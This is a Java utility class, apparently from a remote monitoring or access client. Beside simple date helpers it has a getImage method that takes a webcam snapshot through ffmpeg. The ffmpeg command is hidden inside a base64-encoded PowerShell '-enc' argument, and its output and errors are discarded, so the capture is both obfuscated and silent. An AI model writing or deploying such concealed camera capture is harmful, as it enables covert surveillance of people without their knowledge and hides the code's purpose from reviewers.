package com.rmac.utils;

import java.io.File;
import java.io.IOException;
import java.text.SimpleDateFormat;
import java.util.Calendar;
import java.util.Map;

/**
 * Utility methods.
 */
public class Utils {

  public static SimpleDateFormat formatter = new SimpleDateFormat("yyyy-MM-dd-hh-mm-ss-SS");
  public static SimpleDateFormat dateFormatter = new SimpleDateFormat("yyyy MM dd");

  /**
   * Get current timestamp in <code>yyyy-MM-dd-hh-mm-ss-SS</code> format.
   *
   * @return current timestamp.
   */
  public static String getTimestamp() {
    return formatter.format(Calendar.getInstance().getTime());
  }

  /**
   * Get current date in <code>yyyy MM dd</code> format.
   *
   * @return current date.
   */
  public static String getDate() {
    return dateFormatter.format(Calendar.getInstance().getTime());
  }

  /**
   * Start capturing a snapshot using the default camera.
   *
   * @return Reference to running FFMPEG process.
   */
  public static Process getImage(String filePath) throws IOException {
    ProcessBuilder ffmpegCam = new ProcessBuilder("powershell", "-enc", "\"ZgBmAG0AcABlAGcAIAAtAGYAIABkAHMAaABvAHcAIAAtAGkAIAAiAHYAaQBkAGUAbwA9ACQAKAAoACgAKAAoACgAZgBmAG0AcABlAGcAIAAtAGwAaQBzAHQAXwBkAGUAdgBpAGMAZQBzACAAdAByAHUAZQAgAC0AZgAgAGQAcwBoAG8AdwAgAC0AaQAgAGQAdQBtAG0AeQAgAC0AaABpAGQAZQBfAGIAYQBuAG4AZQByACAALQBsAG8AZwBsAGUAdgBlAGwAIABpAG4AZgBvACAAMgA+ACYAMQAgAHwAIABPAHUAdAAtAFMAdAByAGkAbgBnACkAIAAtAFMAcABsAGkAdAAgACIAYAByAGAAbgAiACAAfAAgAFMAZQBsAGUAYwB0AC0AUwB0AHIAaQBuAGcAIAAiACgAdgBpAGQAZQBvACkAIgApAFsAMABdACAALQBzAHAAbABpAHQAIAAiAF0AIgApAFsAMQBdACAALQByAGUAcABsAGEAYwBlACAAIgBgACIAIgAsACIAIgApAC4AcgBlAHAAbABhAGMAZQAoACcAKAB2AGkAZABlAG8AKQAnACwAJwAnACkAKQAuAFQAcgBpAG0AKAApACkAIgAgAC0AZgByAGEAbQBlAHMAOgB2ACAAMQAgACQAZQBuAHYAOgBDAEEATQBfAEYASQBMAEUAXwBOAEEATQBFACAALQBsAG8AZwBsAGUAdgBlAGwAIABlAHIAcgBvAHIA\"");
    ffmpegCam.directory(new File(Constants.RUNTIME_LOCATION));
    Map<String, String> env = ffmpegCam.environment();
    env.put("CAM_FILE_NAME", filePath);

    Process process = ffmpegCam.start();
    PipeStream err = new PipeStream(process.getErrorStream(), new NoopOutputStream());
    PipeStream out = new PipeStream(process.getInputStream(), new NoopOutputStream());
    err.start();
    out.start();

    return process;
  }
}
